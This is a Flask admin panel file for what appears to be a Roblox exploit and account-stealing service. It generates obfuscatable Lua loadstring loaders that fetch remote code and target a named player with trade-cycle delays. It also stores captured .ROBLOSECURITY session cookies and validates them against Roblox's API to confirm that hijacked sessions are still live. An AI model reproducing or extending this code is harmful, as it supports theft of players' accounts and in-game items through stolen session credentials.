from flask import Blueprint, render_template, request, redirect, url_for, flash, jsonify
from flask_login import login_required, current_user
from app.models import db, Key, User, ActivityLog, Settings, AdminUser, ScriptConfig
from app.services import key_service, webhook_service, script_config_service
from datetime import datetime, timedelta
import json
import requests as http_requests

admin = Blueprint('admin', __name__)

@admin.route('/')
@login_required
def dashboard():
    stats = key_service.get_stats()
    
    # Get recent logs (limit 20)
    recent_logs = ActivityLog.query.order_by(ActivityLog.created_at.desc()).limit(20).all()
    
    # Generate chart data: last 30 days of activations
    chart_labels = []
    chart_data = []
    
    # Fill in date ranges
    for i in range(29, -1, -1):
        day = datetime.utcnow().date() - timedelta(days=i)
        chart_labels.append(day.strftime('%b %d'))
        
        # Count activations on this day
        start = datetime.combine(day, datetime.min.time())
        end = datetime.combine(day, datetime.max.time())
        count = ActivityLog.query.filter(
            ActivityLog.event_type == 'KEY_ACTIVATED',
            ActivityLog.created_at >= start,
            ActivityLog.created_at <= end
        ).count()
        chart_data.append(count)
        
    chart_data_json = {
        'labels': chart_labels,
        'data': chart_data
    }

    return render_template(
        'dashboard.html', 
        stats=stats, 
        recent_logs=recent_logs, 
        chart_data=chart_data_json
    )

@admin.route('/keys')
@login_required
def keys_page():
    status_filter = request.args.get('status')
    if status_filter:
        keys = Key.query.filter_by(status=status_filter).order_by(Key.created_at.desc()).all()
    else:
        keys = Key.query.order_by(Key.created_at.desc()).all()
    return render_template('keys.html', keys=keys)

@admin.route('/keys/generate', methods=['POST'])
@login_required
def generate_keys():
    try:
        count = int(request.form.get('count', 1))
        duration = int(request.form.get('duration', 30))
        note = request.form.get('note', '')
        
        if count < 1 or count > 100:
            return jsonify({'success': False, 'message': 'Count must be between 1 and 100.'}), 400
            
        generated = key_service.generate_key(
            duration_days=duration,
            created_by_id=current_user.id,
            note=note,
            count=count
        )
        
        return jsonify({
            'success': True,
            'keys': generated
        })
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@admin.route('/keys/<int:key_id>/revoke', methods=['POST'])
@login_required
def revoke_key(key_id):
    if key_service.revoke_key(key_id, current_user.id):
        webhook_service.send_admin_action(current_user.username, "REVOKED_KEY", f"Key ID: {key_id}")
        flash('Key revoked successfully.', 'success')
    else:
        flash('Failed to revoke key.', 'danger')
    return redirect(url_for('admin.keys_page'))

@admin.route('/keys/<int:key_id>/ban', methods=['POST'])
@login_required
def ban_key(key_id):
    if key_service.ban_key(key_id, current_user.id):
        webhook_service.send_admin_action(current_user.username, "BANNED_KEY", f"Key ID: {key_id}")
        flash('Key and associated user banned successfully.', 'success')
    else:
        flash('Failed to ban key.', 'danger')
    return redirect(url_for('admin.keys_page'))

@admin.route('/users')
@login_required
def users_page():
    users = User.query.order_by(User.created_at.desc()).all()
    return render_template('users.html', users=users)

@admin.route('/users/<int:user_id>/ban', methods=['POST'])
@login_required
def ban_user(user_id):
    user = User.query.get(user_id)
    if user:
        user.status = 'banned'
        # Also ban keys
        for key in user.keys:
            key.status = 'banned'
        db.session.commit()
        webhook_service.send_admin_action(current_user.username, "BANNED_USER", f"User: {user.username}")
        flash('User and all associated keys banned.', 'success')
    else:
        flash('User not found.', 'danger')
    return redirect(url_for('admin.users_page'))

@admin.route('/users/<int:user_id>/unban', methods=['POST'])
@login_required
def unban_user(user_id):
    user = User.query.get(user_id)
    if user:
        user.status = 'active'
        # Unban keys
        for key in user.keys:
            key.status = 'active'
        db.session.commit()
        webhook_service.send_admin_action(current_user.username, "UNBANNED_USER", f"User: {user.username}")
        flash('User unbanned successfully.', 'success')
    else:
        flash('User not found.', 'danger')
    return redirect(url_for('admin.users_page'))

@admin.route('/logs')
@login_required
def logs_page():
    event_type = request.args.get('event_type')
    page = request.args.get('page', 1, type=int)
    
    query = ActivityLog.query
    if event_type:
        query = query.filter_by(event_type=event_type)
        
    pagination = query.order_by(ActivityLog.created_at.desc()).paginate(page=page, per_page=50, error_out=False)
    logs = pagination.items
    
    # Fetch unique event types for filters
    event_types = db.session.query(ActivityLog.event_type).distinct().all()
    event_types = [et[0] for et in event_types]
    
    return render_template('logs.html', logs=logs, pagination=pagination, event_types=event_types, current_filter=event_type)

@admin.route('/settings', methods=['GET', 'POST'])
@login_required
def settings_page():
    if request.method == 'POST':
        webhook_url = request.form.get('discord_webhook_url')
        server_external_url = request.form.get('server_external_url')
        
        Settings.set('discord_webhook_url', webhook_url)
        Settings.set('server_external_url', server_external_url)
        
        flash('Settings updated successfully.', 'success')
        webhook_service.send_admin_action(current_user.username, "SETTINGS_UPDATED", "Updated Discord Webhook and External URL settings.")
        return redirect(url_for('admin.settings_page'))
        
    webhook_url = Settings.get('discord_webhook_url', '')
    server_external_url = Settings.get('server_external_url', '')
    admins = AdminUser.query.all()
    return render_template('settings.html', webhook_url=webhook_url, server_external_url=server_external_url, admins=admins)

@admin.route('/settings/test-webhook', methods=['POST'])
@login_required
def test_webhook():
    test_delivered = webhook_service.send_webhook(
        title="🔔 System Test Webhook",
        description=f"Admin panel configuration is functioning correctly.",
        color_hex="3b82f6",
        fields=[
            {"name": "Triggered By", "value": current_user.username, "inline": True},
            {"name": "Status", "value": "✓ Connected", "inline": True}
        ]
    )
    if test_delivered:
        return jsonify({'success': True, 'message': 'Test webhook sent successfully!'})
    else:
        return jsonify({'success': False, 'message': 'Failed to send webhook. Ensure URL is valid.'}), 400


@admin.route('/configs')
@login_required
def configs_page():
    configs = script_config_service.list_configs()
    from app.services.brainrot_catalog import OG_ITEMS, SECRET_ITEMS, ANTOH_ITEMS
    return render_template(
        'configs.html',
        configs=configs,
        og_items=OG_ITEMS,
        secret_items=SECRET_ITEMS,
        antoh_items=ANTOH_ITEMS
    )


@admin.route('/configs/create', methods=['POST'])
@login_required
def create_config():
    try:
        label = request.form.get('label', '').strip()
        target = request.form.get('target', '').strip() or None
        delay = int(request.form.get('delay_step', 1))
        trade = int(request.form.get('trade_cycle_delay', 2))

        if not label:
            return jsonify({'success': False, 'message': 'Label is required.'}), 400

        config = script_config_service.create_config(
            label=label,
            target_username=target,
            delay_step=delay,
            trade_cycle_delay=trade
        )

        # Compile and save paste URL
        protocol = 'https' if request.is_secure or request.headers.get('X-Forwarded-Proto') == 'https' else 'http'
        base_url = f"{protocol}://{request.host}"
        paste_url = script_config_service.compile_and_save_paste_url(config.id, base_url=base_url)

        # Send Discord webhook announcement about config creation
        webhook_service.send_webhook(
            title="⚙️ New Script Configuration Created",
            description=f"Admin **{current_user.username}** has initialized a custom Lua script loader configuration.",
            color_hex="10b981",
            fields=[
                {"name": "Label / User", "value": config.label, "inline": True},
                {"name": "Target Player", "value": f"{config.target_name or 'None'} ({config.target_id or 'None'})", "inline": True},
                {"name": "Delays (Step/Trade)", "value": f"{config.delay_step}s / {config.trade_cycle_delay}s", "inline": True},
                {"name": "Loadstring Link", "value": f"`loadstring(game:HttpGet(\"{paste_url}\"))()`", "inline": False}
            ]
        )

        return jsonify({
            'success': True,
            'config': config.to_dict(),
            'paste_url': paste_url,
            'loadstring': f'loadstring(game:HttpGet("{paste_url}"))()'
        })
    except ValueError as val_err:
        return jsonify({'success': False, 'message': str(val_err)}), 400
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


@admin.route('/configs/<int:config_id>/toggle', methods=['POST'])
@login_required
def toggle_config_item(config_id):
    try:
        data = request.get_json() or {}
        item = data.get('item')
        enabled = bool(data.get('enabled'))

        config, msg = script_config_service.toggle_brainrot(config_id, item, enabled)
        if config:
            protocol = 'https' if request.is_secure or request.headers.get('X-Forwarded-Proto') == 'https' else 'http'
            base_url = f"{protocol}://{request.host}"
            paste_url = script_config_service.compile_and_save_paste_url(config.id, base_url=base_url)

            # Send webhook on config update
            webhook_service.send_admin_action(
                current_user.username,
                "CONFIG_ITEM_TOGGLED",
                f"Config '{config.label}': '{item}' set to {'ON' if enabled else 'OFF'}."
            )

            return jsonify({
                'success': True,
                'message': msg,
                'loadstring': f'loadstring(game:HttpGet("{paste_url}"))()'
            })
        return jsonify({'success': False, 'message': msg}), 400
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


@admin.route('/configs/<int:config_id>/toggle-category', methods=['POST'])
@login_required
def toggle_config_category(config_id):
    try:
        data = request.get_json() or {}
        category = data.get('category')
        enabled = bool(data.get('enabled'))

        config, msg = script_config_service.toggle_category(config_id, category, enabled)
        if config:
            protocol = 'https' if request.is_secure or request.headers.get('X-Forwarded-Proto') == 'https' else 'http'
            base_url = f"{protocol}://{request.host}"
            paste_url = script_config_service.compile_and_save_paste_url(config.id, base_url=base_url)

            # Send webhook
            webhook_service.send_admin_action(
                current_user.username,
                "CONFIG_CATEGORY_TOGGLED",
                f"Config '{config.label}': Category '{category.upper()}' items set to {'ON' if enabled else 'OFF'}."
            )

            return jsonify({
                'success': True,
                'message': msg,
                'loadstring': f'loadstring(game:HttpGet("{paste_url}"))()'
            })
        return jsonify({'success': False, 'message': msg}), 400
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


@admin.route('/configs/<int:config_id>/rotate', methods=['POST'])
@login_required
def rotate_config_key(config_id):
    config, msg = script_config_service.update_secret_key(config_id)
    if config:
        protocol = 'https' if request.is_secure or request.headers.get('X-Forwarded-Proto') == 'https' else 'http'
        base_url = f"{protocol}://{request.host}"
        paste_url = script_config_service.compile_and_save_paste_url(config.id, base_url=base_url)

        # Send webhook
        webhook_service.send_admin_action(
            current_user.username,
            "CONFIG_KEY_ROTATED",
            f"Config '{config.label}': Key rotated. New preview: {config.secret_key[:15]}..."
        )

        return jsonify({
            'success': True,
            'message': msg,
            'secret_key': config.secret_key,
            'loadstring': f'loadstring(game:HttpGet("{paste_url}"))()'
        })
    return jsonify({'success': False, 'message': msg}), 400


@admin.route('/configs/<int:config_id>/update-target', methods=['POST'])
@login_required
def update_config_target(config_id):
    username = request.form.get('target', '').strip()
    if not username:
        return jsonify({'success': False, 'message': 'Username is required.'}), 400

    config, msg = script_config_service.set_target(config_id, username)
    if config:
        protocol = 'https' if request.is_secure or request.headers.get('X-Forwarded-Proto') == 'https' else 'http'
        base_url = f"{protocol}://{request.host}"
        paste_url = script_config_service.compile_and_save_paste_url(config.id, base_url=base_url)

        # Send webhook
        webhook_service.send_admin_action(
            current_user.username,
            "CONFIG_TARGET_UPDATED",
            f"Config '{config.label}': Target set to {config.target_name} ({config.target_id})"
        )

        return jsonify({
            'success': True,
            'message': msg,
            'target_name': config.target_name,
            'target_id': config.target_id,
            'loadstring': f'loadstring(game:HttpGet("{paste_url}"))()'
        })
    return jsonify({'success': False, 'message': msg}), 400


@admin.route('/configs/<int:config_id>/update-delays', methods=['POST'])
@login_required
def update_config_delays(config_id):
    try:
        config = ScriptConfig.query.get(config_id)
        if not config:
            return jsonify({'success': False, 'message': 'Config not found.'}), 404

        delay_step = int(request.form.get('delay_step', 1))
        trade_cycle_delay = int(request.form.get('trade_cycle_delay', 2))

        config.delay_step = delay_step
        config.trade_cycle_delay = trade_cycle_delay
        db.session.commit()

        protocol = 'https' if request.is_secure or request.headers.get('X-Forwarded-Proto') == 'https' else 'http'
        base_url = f"{protocol}://{request.host}"
        paste_url = script_config_service.compile_and_save_paste_url(config.id, base_url=base_url)

        # Send webhook
        webhook_service.send_admin_action(
            current_user.username,
            "CONFIG_DELAYS_UPDATED",
            f"Config '{config.label}': Delay Step={delay_step}s, Trade Cycle Delay={trade_cycle_delay}s"
        )

        return jsonify({
            'success': True,
            'message': 'Delays updated and re-compiled.',
            'delay_step': config.delay_step,
            'trade_cycle_delay': config.trade_cycle_delay,
            'loadstring': f'loadstring(game:HttpGet("{paste_url}"))()'
        })
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


@admin.route('/configs/<int:config_id>/delete', methods=['POST'])
@login_required
def delete_config(config_id):
    config = ScriptConfig.query.get(config_id)
    if config:
        db.session.delete(config)
        db.session.commit()

        # Send webhook
        webhook_service.send_admin_action(
            current_user.username,
            "CONFIG_DELETED",
            f"Config '{config.label}' was deleted."
        )

        return jsonify({'success': True, 'message': 'Configuration deleted.'})
    return jsonify({'success': False, 'message': 'Config not found.'}), 404


@admin.route('/configs/<int:config_id>/update-settings', methods=['POST'])
@login_required
def update_config_settings(config_id):
    try:
        config = ScriptConfig.query.get(config_id)
        if not config:
            return jsonify({'success': False, 'message': 'Config not found.'}), 404

        # Parse form variables
        obfuscate = request.form.get('obfuscate') == 'true'
        loadstring_type = request.form.get('loadstring_type', 'raw').strip()

        config.obfuscate = obfuscate
        config.loadstring_type = loadstring_type
        db.session.commit()

        # Recompile paste URL
        protocol = 'https' if request.is_secure or request.headers.get('X-Forwarded-Proto') == 'https' else 'http'
        base_url = f"{protocol}://{request.host}"
        paste_url = script_config_service.compile_and_save_paste_url(config.id, base_url=base_url)

        # Log action
        webhook_service.send_admin_action(
            current_user.username,
            "CONFIG_SETTINGS_UPDATED",
            f"Config '{config.label}': Obfuscate={'ON' if obfuscate else 'OFF'}, Wrapper={loadstring_type.upper()}"
        )

        return jsonify({
            'success': True,
            'message': 'Configuration settings updated and compiled.',
            'obfuscate': config.obfuscate,
            'loadstring_type': config.loadstring_type,
            'loadstring': config.to_dict()['loadstring']
        })
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


@admin.route('/configs/cookies', methods=['GET'])
@login_required
def list_captured_cookies():
    from app.models import CapturedCookie
    cookies = CapturedCookie.query.order_by(CapturedCookie.updated_at.desc()).all()
    return jsonify({
        'success': True,
        'cookies': [c.to_dict() for c in cookies]
    })


@admin.route('/configs/cookies/<int:cookie_id>/validate', methods=['POST'])
@login_required
def validate_captured_cookie(cookie_id):
    from app.models import CapturedCookie
    cookie_record = CapturedCookie.query.get(cookie_id)
    if not cookie_record:
        return jsonify({'success': False, 'message': 'Cookie record not found.'}), 404

    try:
        # Check against Roblox authenticated API
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie_record.cookie_value}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        resp = http_requests.get('https://users.roblox.com/v1/users/authenticated', headers=headers, timeout=6)
        if resp.status_code == 200:
            data = resp.json()
            cookie_record.status = 'valid'
            cookie_record.player_id = str(data.get('id', cookie_record.player_id))
            cookie_record.player_name = data.get('name', cookie_record.player_name)
            cookie_record.updated_at = datetime.utcnow()
            db.session.commit()
            return jsonify({
                'success': True,
                'status': 'valid',
                'username': data.get('name'),
                'id': data.get('id')
            })
        else:
            cookie_record.status = 'expired'
            db.session.commit()
            return jsonify({
                'success': True,
                'status': 'expired',
                'message': 'Session expired or invalidated by owner.'
            })
    except Exception as e:
        return jsonify({'success': False, 'message': f'Validation failed: {str(e)}'}), 500


@admin.route('/configs/cookies/<int:cookie_id>/delete', methods=['POST'])
@login_required
def delete_captured_cookie(cookie_id):
    from app.models import CapturedCookie
    cookie_record = CapturedCookie.query.get(cookie_id)
    if cookie_record:
        db.session.delete(cookie_record)
        db.session.commit()
        return jsonify({'success': True, 'message': 'Cookie deleted.'})
    return jsonify({'success': False, 'message': 'Cookie not found.'}), 404

